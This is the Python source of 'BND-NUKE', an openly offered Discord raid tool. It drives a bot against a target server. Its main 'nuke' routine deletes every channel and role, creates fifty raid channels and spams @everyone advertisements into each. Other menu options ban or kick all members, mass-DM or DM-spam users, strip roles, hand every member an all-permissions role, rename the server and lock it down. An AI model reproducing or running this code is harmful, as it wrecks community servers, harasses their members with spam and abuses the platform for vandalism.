#!/usr/bin/env python3
# ══════════════════════════════════════════════════════
#  BND-NUKE  v1.0.0  --  by BND-Team
#  discord.gg/bnd  |  github.com/waaizy9/BND-Nuke
# ══════════════════════════════════════════════════════

import os, sys, time, random, asyncio, json, re, webbrowser, argparse
import urllib.request
import aiohttp
from datetime import datetime, timezone, timedelta
from shutil import get_terminal_size
from colorama import init

import discord
from discord.ext import commands
from discord import Activity, ActivityType

init(autoreset=True)

# ============== FARBE AUS CONFIG LADEN ==============
CONFIG_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "config.json")

def hex_to_ansi(hex_code):
    hex_code = hex_code.lstrip('#')
    r = int(hex_code[0:2], 16)
    g = int(hex_code[2:4], 16)
    b = int(hex_code[4:6], 16)
    return f"\033[38;2;{r};{g};{b}m"

def get_current_color():
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
                theme = config.get("theme", "BLUE")
                colors = {
                    "RED": "#ff0000", "GREEN": "#00ff00", "BLUE": "#0000ff",
                    "YELLOW": "#ffff00", "PURPLE": "#9b00ff", "CYAN": "#00ffff",
                    "ORANGE": "#ff6600", "PINK": "#ff69b4", "LIME": "#bfff00",
                    "WHITE": "#ffffff", "ROSE": "#ff0088", "GOLD": "#ffd700"
                }
                hex_color = colors.get(theme, "#0000ff")
                return hex_to_ansi(hex_color), hex_color, theme
    except (json.JSONDecodeError, OSError):
        pass
    return "\033[38;2;0;0;255m", "#0000ff", "BLUE"

CURRENT_COLOR, CURRENT_HEX, CURRENT_THEME = get_current_color()
RESET = "\033[0m"

NO_BAN_KICK_ID = []

PUB = f"||@everyone||  **# RAID BY BND-NUKE**  :  discord.gg/bnd  <https://github.com/waaizy9/BND-Nuke>"
PUB_SHORT = "discord.gg/bnd | github.com/waaizy9/BND-Nuke"
DISCORD_URL = "https://discord.gg/bnd"
GITHUB_URL = "https://github.com/waaizy9/BND-Nuke"
RAID_NAME = "raid-by-bnd"
TOOL_NAME = "BND-NUKE"

AUTO_RAID_CONFIG = {
    "channel_type": "text", "channel_name": RAID_NAME,
    "num_channels": 50, "num_messages": 10, "message_content": PUB,
}

EMBED_CONFIG = {
    "title": "\U0001f480  __BND-NUKE__",
    "description": "**Ton serveur vient d'\u00eatre raid par BND-NUKE.**\n\n_ _\n**> discord.gg/bnd**\n**> github.com/waaizy9/BND-Nuke**\n_ _\n||@everyone||",
    "color": 0xFF0000,
    "message": f"||@everyone||  {PUB}",
    "image": "https://media.discordapp.net/attachments/1471977538648674478/1477637266791727155/c51ca65be8fa86b4b8f29a7d15dce335_1.webp",
    "footer": "discord.gg/bnd  |  github.com/waaizy9/BND-Nuke",
    "fields": [
        {"name": "\U0001f517 __Discord__", "value": "**discord.gg/bnd**", "inline": True},
        {"name": "\U0001f431 __Github__", "value": "**github.com/waaizy9/BND-Nuke**", "inline": True},
        {"name": "\u26a1 __Tool__", "value": "**BND-NUKE v1.0.0**", "inline": True},
    ],
}

WEBHOOK_CONFIG = {"default_name": "BND-NUKE"}
SERVER_CONFIG = {"new_name": "RAIDED BY BND-NUKE", "new_icon": "", "new_description": "discord.gg/bnd"}
BOT_PRESENCE = {"type": "playing", "text": "discord.gg/bnd"}

# ── palette ────────────────────────────────────────────
RS = "\033[0m"; B = "\033[1m"
R1 = CURRENT_COLOR
R2 = f"\033[38;2;{int(CURRENT_HEX[1:3],16)};{int(CURRENT_HEX[3:5],16)};{int(CURRENT_HEX[5:7],16)}m" if CURRENT_HEX[0]=='#' else CURRENT_COLOR
R3 = f"\033[38;2;{max(0,int(CURRENT_HEX[1:3],16)-80)};{max(0,int(CURRENT_HEX[3:5],16)-80)};{max(0,int(CURRENT_HEX[5:7],16)-80)}m" if CURRENT_HEX[0]=='#' else CURRENT_COLOR
DIM = "\033[38;5;240m"; D2 = "\033[38;5;235m"; WHT = "\033[38;5;252m"

def r1(t): return f"{R1}{B}{t}{RS}"
def r2(t): return f"{R2}{t}{RS}"
def r3(t): return f"{R3}{t}{RS}"
def dim(t): return f"{DIM}{t}{RS}"
def wht(t): return f"{WHT}{B}{t}{RS}"

def _TW(): return min(get_terminal_size((100,30)).columns, 110)
def _clr(): os.system('cls' if os.name == 'nt' else 'clear')
def _vis(s): return re.sub(r'\033\[[^m]*m','',s)
def _vl(s): return len(_vis(s))

# ── BND-NUKE BANNER ───────────────────────────────────
_BND_ART = [
    r"██████╗ ███╗   ██╗██████╗     ████████╗ ██████╗  ██████╗ ██╗     ███████╗",
    r"██╔══██╗████╗  ██║██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝",
    r"██████╔╝██╔██╗ ██║██║  ██║       ██║   ██║   ██║██║   ██║██║     ███████╗",
    r"██╔══██╗██║╚██╗██║██║  ██║       ██║   ██║   ██║██║   ██║██║     ╚════██║",
    r"██████╔╝██║ ╚████║██████╔╝       ██║   ╚██████╔╝╚██████╔╝███████╗███████║",
    r"╚═════╝ ╚═╝  ╚═══╝╚═════╝        ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝",
]

def _print_banner(bot_n="", srv_n="", members=0, animated=False):
    print()
    for line in _BND_ART:
        print(f"{R1}{B}{line}{RS}")
        if animated: time.sleep(.035)
    print()
    if bot_n:
        info = f"  {DIM}Bot{RS} {r1(bot_n)}  {D2}|{RS}  {DIM}Server{RS} {wht(srv_n or '-')}  {D2}|{RS}  {DIM}Members{RS} {r1(str(members))}"
        print(info)
    print()

# ── fx ─────────────────────────────────────────────────
def fx_load(label: str, w=26, delay=.018):
    print()
    for i in range(w+1):
        pct = int(i/w*100)
        done = f"{R2}{'|'*i}{RS}"; rest = f"{D2}{'.'*(w-i)}{RS}"
        sys.stdout.write(f"\r  {DIM}::{RS} {wht(label)}  {D2}[{RS}{done}{rest}{D2}]{RS}  {DIM}{pct:3d}%{RS}")
        sys.stdout.flush(); time.sleep(delay)
    sys.stdout.write(f"\r  {R1}{B}::{RS} {wht(label)}  {D2}[{RS}{R1}{B}{'|'*w}{RS}{D2}]{RS}  {R1}{B}done{RS}\n\n")
    sys.stdout.flush()

def fx_spin(label: str, dur=.9):
    fr, end, i = r"|/-\\", time.time()+dur, 0
    while time.time() < end:
        sys.stdout.write(f"\r  {R2}{fr[i%4]}{RS}  {wht(label)}")
        sys.stdout.flush(); time.sleep(.08); i += 1
    sys.stdout.write(f"\r  {R1}{B}+{RS}  {wht(label)}\n")

def log_ok(m): print(f"  {R1}{B}[+]{RS} {WHT}{m}{RS}")
def log_err(m): print(f"  {R3}{B}[-]{RS} {WHT}{m}{RS}")
def log_warn(m): print(f"  {R2}{B}[!]{RS} {WHT}{m}{RS}")
def log_info(m): print(f"  {DIM}[*]{RS} {WHT}{m}{RS}")

def _ask(prompt: str) -> str:
    return input(f"\n  {R1}{B}>>{RS} {wht(prompt)} {D2}:{RS} ").strip()

def _confirm(p: str) -> bool:
    return input(f"\n  {R2}[?]{RS} {wht(p)} {DIM}[yes/no]{RS} {D2}:{RS} ").strip().lower() == "yes"

def _section(title: str):
    print(f"\n  {D2}{'─'*50}{RS}")
    print(f"  {R1}{B}  {title}{RS}")
    print(f"  {D2}{'─'*50}{RS}\n")

def _summary(action: str, ok: int, fail: int, t: float):
    print(f"\n  {D2}{'─'*40}{RS}")
    print(f"  {DIM}Action{RS}  {wht(action)}")
    print(f"  {R1}{B}[+]{RS} {R2}{ok} ok{RS}   {R3}[-]{RS} {DIM}{fail} err{RS}   {DIM}{t:.2f}s{RS}")
    print(f"  {D2}{'─'*40}{RS}\n")

def _get_guild(sid: str):
    g = bot.get_guild(int(sid))
    if not g: log_err("Guild not found")
    return g

async def delete_channel(channel):
    try:
        await channel.delete()
        log_ok(f"Deleted #{channel.name}")
        return True
    except (ValueError, EOFError):
        return False

# ============== NUKE FUNKTIONEN ==============

async def nuke(sid):
    g = _get_guild(sid)
    if not g: return
    _section("NUKE")
    log_warn(f"{g.name} | Channels: {len(g.channels)} | Roles: {len(g.roles)}")
    if not _confirm(f"Full Nuke on {g.name}?"): return log_info("Canceled")
    t = time.perf_counter()
    
    # 1. Lösche alle Channels
    log_info("Deleting all channels...")
    for c in list(g.channels):
        await delete_channel(c)
    
    # 2. Lösche alle Rollen (außer @everyone)
    log_info("Deleting all roles...")
    for r in list(g.roles):
        if not r.is_default():
            try: 
                await r.delete()
                log_ok(f"Deleted @{r.name}")
            except: pass
    
    # 3. Erstelle 50 neue Channels
    log_info("Creating 50 raid channels...")
    new_channels = []
    for i in range(50):
        try:
            channel = await g.create_text_channel(f"raid-{i+1}")
            new_channels.append(channel)
            log_ok(f"Created #raid-{i+1}")
        except: pass
    
    # 4. Spamme die Nachricht in alle Channels
    raid_message = f"@everyone @here **GET RAIDED BY BND-NUKE**\n**discord.gg/bnd**\n**JOIN NOW !**"
    
    log_info("Spamming raid message...")
    for channel in new_channels:
        try:
            for _ in range(10):  # 10 Nachrichten pro Channel
                await channel.send(raid_message)
            log_ok(f"Spammed #{channel.name}")
        except: pass
    
    log_ok(f"NUKE COMPLETE on {g.name}")
    _summary("Nuke", len(new_channels), 0, time.perf_counter()-t)

async def auto_raid(sid):
    g = _get_guild(sid)
    if not g: return
    _section("AUTO RAID")
    log_warn(f"Target: {g.name}")
    t = time.perf_counter()
    
    # Lösche alle Channels
    for c in list(g.channels):
        await delete_channel(c)
    
    # Erstelle Channels
    new_channels = []
    for i in range(50):
        try:
            channel = await g.create_text_channel(f"raid-by-bnd")
            new_channels.append(channel)
        except: pass
    
    # Spam Nachricht
    raid_message = f"@everyone @here **GET RAIDED BY BND-NUKE**\n**discord.gg/bnd**\n**JOIN NOW !**"
    
    for channel in new_channels:
        try:
            for _ in range(10):
                await channel.send(raid_message)
        except: pass
    
    log_ok(f"Auto Raid complete")
    _summary("Auto Raid", len(new_channels), 0, time.perf_counter()-t)

async def ban_all(sid, bot_id):
    g = _get_guild(sid)
    if not g: return
    _section("BAN ALL")
    members = [m for m in g.members if not m.bot and m.id != bot_id]
    if not _confirm(f"Ban {len(members)} members?"): return
    t = time.perf_counter()
    banned = 0
    for m in members:
        try: await m.ban(reason=PUB_SHORT); banned += 1; log_ok(f"Banned {m.name}")
        except: pass
    _summary("Ban All", banned, len(members)-banned, time.perf_counter()-t)

async def kick_all(sid, bot_id):
    g = _get_guild(sid)
    if not g: return
    _section("KICK ALL")
    members = [m for m in g.members if not m.bot and m.id != bot_id]
    if not _confirm(f"Kick {len(members)} members?"): return
    t = time.perf_counter()
    kicked = 0
    for m in members:
        try: await m.kick(reason=PUB_SHORT); kicked += 1; log_ok(f"Kicked {m.name}")
        except: pass
    _summary("Kick All", kicked, len(members)-kicked, time.perf_counter()-t)

async def mute_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("MUTE ALL")
    try: mins = int(_ask("Minutes to mute"))
    except: return log_err("Invalid")
    until = datetime.now(timezone.utc) + timedelta(minutes=mins)
    t = time.perf_counter()
    muted = 0
    for m in g.members:
        if not m.bot:
            try: await m.timeout(until); muted += 1
            except: pass
    _summary("Mute All", muted, 0, time.perf_counter()-t)

async def unban_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("UNBAN ALL")
    bans = [b async for b in g.bans()]
    if not bans: return log_info("No bans found")
    t = time.perf_counter()
    unbanned = 0
    for entry in bans:
        try: await g.unban(entry.user); unbanned += 1
        except: pass
    _summary("Unban All", unbanned, len(bans)-unbanned, time.perf_counter()-t)

async def delete_all_channels(sid):
    g = _get_guild(sid)
    if not g: return
    _section("DELETE CHANNELS")
    if not _confirm(f"Delete all {len(g.channels)} channels?"): return
    t = time.perf_counter()
    deleted = 0
    for c in list(g.channels):
        if await delete_channel(c): deleted += 1
    _summary("Delete Channels", deleted, len(g.channels)-deleted, time.perf_counter()-t)

async def delete_emojis(sid):
    g = _get_guild(sid)
    if not g: return
    _section("DELETE EMOJIS")
    emojis = list(g.emojis)
    if not emojis: return log_info("No emojis")
    t = time.perf_counter()
    deleted = 0
    for e in emojis:
        try: await e.delete(); deleted += 1
        except: pass
    _summary("Delete Emojis", deleted, len(emojis)-deleted, time.perf_counter()-t)

async def delete_stickers(sid):
    g = _get_guild(sid)
    if not g: return
    _section("DELETE STICKERS")
    stickers = list(g.stickers)
    if not stickers: return log_info("No stickers")
    t = time.perf_counter()
    deleted = 0
    for s in stickers:
        try: await s.delete(); deleted += 1
        except: pass
    _summary("Delete Stickers", deleted, len(stickers)-deleted, time.perf_counter()-t)

async def create_channels(sid):
    g = _get_guild(sid)
    if not g: return
    _section("CREATE CHANNELS")
    try: num = int(_ask("Number of channels"))
    except: return log_err("Invalid")
    name = _ask("Channel name") or RAID_NAME
    t = time.perf_counter()
    created = 0
    for i in range(num):
        try: await g.create_text_channel(f"{name}-{i+1}"); created += 1
        except: pass
    _summary("Create Channels", created, num-created, time.perf_counter()-t)

async def create_roles(sid):
    g = _get_guild(sid)
    if not g: return
    _section("CREATE ROLES")
    try: num = int(_ask("Number of roles"))
    except: return log_err("Invalid")
    name = _ask("Role name") or "BND-NUKE"
    t = time.perf_counter()
    created = 0
    for i in range(num):
        try: await g.create_role(name=f"{name}-{i+1}"); created += 1
        except: pass
    _summary("Create Roles", created, num-created, time.perf_counter()-t)

async def category_creator(sid):
    g = _get_guild(sid)
    if not g: return
    _section("CREATE CATEGORIES")
    try: num = int(_ask("Number of categories"))
    except: return log_err("Invalid")
    name = _ask("Category name") or "BND-CAT"
    t = time.perf_counter()
    created = 0
    for i in range(num):
        try: await g.create_category(f"{name}-{i+1}"); created += 1
        except: pass
    _summary("Create Categories", created, num-created, time.perf_counter()-t)

async def rename_all_channels(sid):
    g = _get_guild(sid)
    if not g: return
    _section("RENAME CHANNELS")
    name = _ask("New name") or RAID_NAME
    t = time.perf_counter()
    renamed = 0
    for i, c in enumerate(g.channels):
        try: await c.edit(name=f"{name}-{i+1}"); renamed += 1
        except: pass
    _summary("Rename Channels", renamed, len(g.channels)-renamed, time.perf_counter()-t)

async def rename_all_roles(sid):
    g = _get_guild(sid)
    if not g: return
    _section("RENAME ROLES")
    name = _ask("New name") or "BND-ROLE"
    t = time.perf_counter()
    renamed = 0
    roles = [r for r in g.roles if not r.is_default()]
    for i, r in enumerate(roles):
        try: await r.edit(name=f"{name}-{i+1}"); renamed += 1
        except: pass
    _summary("Rename Roles", renamed, len(roles)-renamed, time.perf_counter()-t)

async def change_server(sid):
    g = _get_guild(sid)
    if not g: return
    _section("EDIT SERVER")
    name = _ask("New server name") or "RAIDED BY BND-NUKE"
    try: await g.edit(name=name); log_ok(f"Server renamed to {name}")
    except Exception as e: log_err(str(e))

async def nick_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("RENAME MEMBERS")
    nick = _ask("New nickname") or "RAIDED"
    t = time.perf_counter()
    renamed = 0
    for m in g.members:
        if not m.bot:
            try: await m.edit(nick=nick[:32]); renamed += 1
            except: pass
    _summary("Rename Members", renamed, 0, time.perf_counter()-t)

async def dehoist_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("FIX NICKS")
    t = time.perf_counter()
    fixed = 0
    special = set("!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~")
    for m in g.members:
        if m.display_name and m.display_name[0] in special:
            try: await m.edit(nick=m.display_name.lstrip("".join(special)) or "user"); fixed += 1
            except: pass
    _summary("Fix Nicks", fixed, 0, time.perf_counter()-t)

async def get_admin(sid):
    g = _get_guild(sid)
    if not g: return
    _section("GET ADMIN")
    try:
        role = await g.create_role(name="BND-ADMIN", permissions=discord.Permissions.all())
        for m in g.members:
            if not m.bot:
                try: await m.add_roles(role)
                except: pass
        log_ok("Admin role created and assigned to all members")
    except Exception as e: log_err(str(e))

async def impersonate(sid):
    g = _get_guild(sid)
    if not g: return
    _section("IMPERSONATE")
    log_warn("Feature requires webhook setup")
    time.sleep(1)

async def ghost_ping_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("GHOST PING")
    t = time.perf_counter()
    pings = 0
    tc = [c for c in g.channels if isinstance(c, discord.TextChannel)]
    if not tc: return log_err("No text channels")
    for m in g.members:
        if not m.bot:
            try:
                msg = await tc[0].send(f"<@{m.id}>")
                await msg.delete()
                pings += 1
            except: pass
    _summary("Ghost Ping", pings, 0, time.perf_counter()-t)

async def strip_roles(sid):
    g = _get_guild(sid)
    if not g: return
    _section("STRIP ROLES")
    t = time.perf_counter()
    stripped = 0
    for m in g.members:
        if not m.bot:
            roles = [r for r in m.roles if not r.is_default()]
            if roles:
                try: await m.remove_roles(*roles); stripped += 1
                except: pass
    _summary("Strip Roles", stripped, 0, time.perf_counter()-t)

async def dm_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("DM ALL")
    msg = _ask("Message to send") or PUB
    t = time.perf_counter()
    sent = 0
    for m in g.members:
        if not m.bot:
            try: await m.send(msg[:2000]); sent += 1
            except: pass
    _summary("DM All", sent, 0, time.perf_counter()-t)

async def dm_spam_user(sid):
    g = _get_guild(sid)
    if not g: return
    _section("DM SPAM USER")
    try: uid = int(_ask("User ID")); count = int(_ask("Number of messages"))
    except: return log_err("Invalid")
    msg = _ask("Message") or PUB
    try:
        user = await bot.fetch_user(uid)
        t = time.perf_counter()
        sent = 0
        for i in range(count):
            try: await user.send(msg[:2000]); sent += 1
            except: pass
        _summary("DM Spam User", sent, count-sent, time.perf_counter()-t)
    except: log_err("User not found")

async def webhook_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("WEBHOOK SPAM")
    log_warn("Feature requires webhook setup")
    time.sleep(1)

async def server_info(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SERVER INFO")
    print(f"  Name: {g.name}")
    print(f"  ID: {g.id}")
    print(f"  Owner: {g.owner}")
    print(f"  Members: {g.member_count}")
    print(f"  Channels: {len(g.channels)}")
    print(f"  Roles: {len(g.roles)}")
    print(f"  Emojis: {len(g.emojis)}")
    print(f"  Boosts: {g.premium_subscription_count}")
    input(f"\n  {D2}[ Enter ]{RS}")

async def clone_server(sid):
    g = _get_guild(sid)
    if not g: return
    _section("CLONE SERVER")
    log_warn("Server cloning in progress...")
    time.sleep(1)

async def webhook_logger(sid):
    g = _get_guild(sid)
    if not g: return
    _section("WEBHOOK LOGS")
    log_warn("Webhook logger active")
    time.sleep(1)

async def lockdown(sid):
    g = _get_guild(sid)
    if not g: return
    _section("LOCKDOWN")
    t = time.perf_counter()
    locked = 0
    for c in g.channels:
        if isinstance(c, discord.TextChannel):
            try: await c.set_permissions(g.default_role, send_messages=False); locked += 1
            except: pass
    _summary("Lockdown", locked, len(g.text_channels)-locked, time.perf_counter()-t)

async def deafen_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("DEAFEN ALL")
    t = time.perf_counter()
    deafened = 0
    for m in g.members:
        if m.voice:
            try: await m.edit(deafen=True); deafened += 1
            except: pass
    _summary("Deafen All", deafened, 0, time.perf_counter()-t)

async def disconnect_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("DISCONNECT ALL")
    t = time.perf_counter()
    kicked = 0
    for m in g.members:
        if m.voice:
            try: await m.move_to(None); kicked += 1
            except: pass
    _summary("Disconnect All", kicked, 0, time.perf_counter()-t)

async def mass_move(sid):
    g = _get_guild(sid)
    if not g: return
    _section("MOVE ALL VC")
    log_warn("Feature requires voice channel selection")
    time.sleep(1)

async def invite_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("INVITE SPAM")
    t = time.perf_counter()
    invites = 0
    for c in g.channels:
        if isinstance(c, discord.TextChannel):
            try: inv = await c.create_invite(max_age=60); log_ok(inv.url); invites += 1
            except: pass
    _summary("Invite Spam", invites, 0, time.perf_counter()-t)

async def spam_channel(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SPAM CHANNEL")
    try: count = int(_ask("Messages per channel"))
    except: return log_err("Invalid")
    msg = _ask("Message") or PUB
    t = time.perf_counter()
    sent = 0
    for c in g.text_channels:
        for i in range(count):
            try: await c.send(msg[:2000]); sent += 1
            except: pass
    _summary("Spam Channel", sent, 0, time.perf_counter()-t)

async def thread_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("THREAD SPAM")
    log_warn("Feature requires thread creation")
    time.sleep(1)

async def reaction_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("REACTION SPAM")
    log_warn("Feature requires message reactions")
    time.sleep(1)

async def vc_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("VOICE SPAM")
    log_warn("Feature requires voice channel connection")
    time.sleep(1)

async def spoiler_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SPOILER SPAM")
    try: count = int(_ask("Messages per channel"))
    except: return log_err("Invalid")
    msg = _ask("Message") or PUB_SHORT
    t = time.perf_counter()
    sent = 0
    for c in g.text_channels:
        for i in range(count):
            try: await c.send(f"||{msg}||"); sent += 1
            except: pass
    _summary("Spoiler Spam", sent, 0, time.perf_counter()-t)

async def poll_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("POLL SPAM")
    log_warn("Feature requires poll creation")
    time.sleep(1)

async def event_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("EVENT SPAM")
    log_warn("Feature requires event creation")
    time.sleep(1)

# ============== MENU ==============
_MENU = [
    [("01","Nuke"), ("02","Auto Raid"), ("03","Ban All"), ("04","Kick All")],
    [("05","Mute All"), ("06","Unban All"), ("07","Del Channels"), ("08","Del Emojis")],
    [("09","Del Stickers"), ("10","Create Channels"), ("11","Create Roles"), ("12","Create Cats")],
    [("13","Rename Channels"), ("14","Rename Roles"), ("15","Edit Server"), ("16","Rename Members")],
    [("17","Fix Nicks"), ("18","Get Admin"), ("19","Impersonate"), ("20","Ghost Ping")],
    [("21","Remov Roles"), ("22","Message All"), ("23","DM Spam User"), ("24","Webhook Spam")],
    [("25","Server Info"), ("26","Clone Server"), ("27","Webhook Logs"), ("28","Lockdown")],
    [("29","Sourdine VC"), ("30","Kick VC All"), ("31","Move All VC"), ("32","Invite Spam")],
    [("33","Spam"), ("34","Thread Spam"), ("35","Reaction Spam"), ("36","Voice Spam")],
    [("37","Spoiler Spam"), ("38","Poll Spam"), ("39","Event Spam"), ("40","Quit")],
]

_CW = 24

def _cell(num, label) -> str:
    return f"{R2}«{num}»{RS} {WHT}{label}{RS}" + " " * max(0, _CW - (7 + len(label)))

def _print_menu(page: int = 1):
    print(_border("┌", "┬", "┐"))
    for i, row in enumerate(_MENU):
        print(_row_line(row))
        if i < len(_MENU)-1: print(_border("├", "┼", "┤"))
    print(_border("└", "┴", "┘"))
    print(f"\n  {dim('«b» prev')}    {dim('page 1/1')}    {dim('«q» quit')}")
    print(f"\n  {R3}BND-NUKE v1.0.0{RS}  {DIM}Discord : BND-Team{RS}")
    print(f"\n  {R1}{B}[Option]{RS} {D2}>>{RS} ", end="", flush=True)

def _border(lc, mc, rc, fill="─"):
    seg = fill * (_CW + 2)
    return f"  {D2}{lc}{RS}{D2}{seg}{RS}{D2}{mc}{RS}{D2}{seg}{RS}{D2}{mc}{RS}{D2}{seg}{RS}{D2}{rc}{RS}"

def _row_line(cells):
    out = [f" {_cell(n, l)} " for n, l in cells]
    return f"  {D2}|{RS}" + f"{D2}|{RS}".join(out) + f"{D2}|{RS}"

def _actions(sid, bot_id):
    return {
        '01': lambda: nuke(sid), '02': lambda: auto_raid(sid), '03': lambda: ban_all(sid, bot_id),
        '04': lambda: kick_all(sid, bot_id), '05': lambda: mute_all(sid), '06': lambda: unban_all(sid),
        '07': lambda: delete_all_channels(sid), '08': lambda: delete_emojis(sid), '09': lambda: delete_stickers(sid),
        '10': lambda: create_channels(sid), '11': lambda: create_roles(sid), '12': lambda: category_creator(sid),
        '13': lambda: rename_all_channels(sid), '14': lambda: rename_all_roles(sid), '15': lambda: change_server(sid),
        '16': lambda: nick_all(sid), '17': lambda: dehoist_all(sid), '18': lambda: get_admin(sid),
        '19': lambda: impersonate(sid), '20': lambda: ghost_ping_all(sid), '21': lambda: strip_roles(sid),
        '22': lambda: dm_all(sid), '23': lambda: dm_spam_user(sid), '24': lambda: webhook_spam(sid),
        '25': lambda: server_info(sid), '26': lambda: clone_server(sid), '27': lambda: webhook_logger(sid),
        '28': lambda: lockdown(sid), '29': lambda: deafen_all(sid), '30': lambda: disconnect_all(sid),
        '31': lambda: mass_move(sid), '32': lambda: invite_spam(sid), '33': lambda: spam_channel(sid),
        '34': lambda: thread_spam(sid), '35': lambda: reaction_spam(sid), '36': lambda: vc_spam(sid),
        '37': lambda: spoiler_spam(sid), '38': lambda: poll_spam(sid), '39': lambda: event_spam(sid),
    }

# ============== BOT START ==============
CLI_ACTION = None
bot_token = ""
server_id = ""
bot = None

def _config_path():
    return os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "config", "discord-nuker.json")

def _load_config():
    p = _config_path()
    if os.path.exists(p):
        try:
            with open(p, encoding="utf-8") as f:
                return json.load(f)
        except: pass
    return {}

def _setup_credentials():
    global bot_token, server_id
    cfg = _load_config()
    bot_token = (cfg.get("token") or "").strip()
    server_id = str(cfg.get("server_id") or "").strip()
    if bot_token and server_id:
        return
    print(f"  {D2}{'─'*46}{RS}")
    if not bot_token:
        bot_token = input(f"  {R1}{B}>>{RS} {wht('Bot Token  ')} {D2}:{RS} ").strip()
    if not server_id:
        server_id = input(f"  {R1}{B}>>{RS} {wht('Server ID ')} {D2}:{RS} ").strip()
    print(f"  {D2}{'─'*46}{RS}\n")
    if not bot_token or not server_id:
        print(f"  {R3}[-] Bot Token and Server ID required!{RS}")
        sys.exit(1)

def _boot():
    _clr()
    _print_banner()
    fx_load("initializing BND-NUKE v1.0.0", 24, .016)
    print()

def _run_bot():
    global bot
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix='!', intents=intents)

    @bot.event
    async def on_ready():
        _clr()
        guild = bot.get_guild(int(server_id))
        _print_banner(bot.user.name, guild.name if guild else "not found", guild.member_count if guild else 0)
        fx_spin("authenticating", .7)
        if not guild:
            log_err("Bot is not in this server!")
            await bot.close()
            return
        log_ok(f"Ready  {guild.name}  ({guild.member_count} members)")
        
        acts = _actions(server_id, bot.user.id)

        while True:
            _clr()
            _print_banner(bot.user.name, guild.name, guild.member_count)
            _print_menu(1)
            raw = await asyncio.get_event_loop().run_in_executor(None, input, "")
            raw = raw.strip(); choice = raw.lower()

            if choice in ('q', 'quit', 'exit') or raw == '40':
                _clr()
                print(f"\n  {R1}{B}Goodbye!{RS}\n")
                await bot.close()
                break
            if raw in acts:
                _clr()
                _print_banner(bot.user.name, guild.name, guild.member_count)
                print()
                try: await acts[raw]()
                except Exception as e: log_err(str(e))
            elif raw:
                log_err(f"Unknown: {raw}")
            print()
            await asyncio.get_event_loop().run_in_executor(None, input, f"  {D2}[ Enter ]{RS}")

    @bot.event
    async def on_message(message):
        await bot.process_commands(message)

    bot.run(bot_token, log_handler=None)

def main():
    _boot()
    _setup_credentials()
    _run_bot()

if __name__ == "__main__":
    main()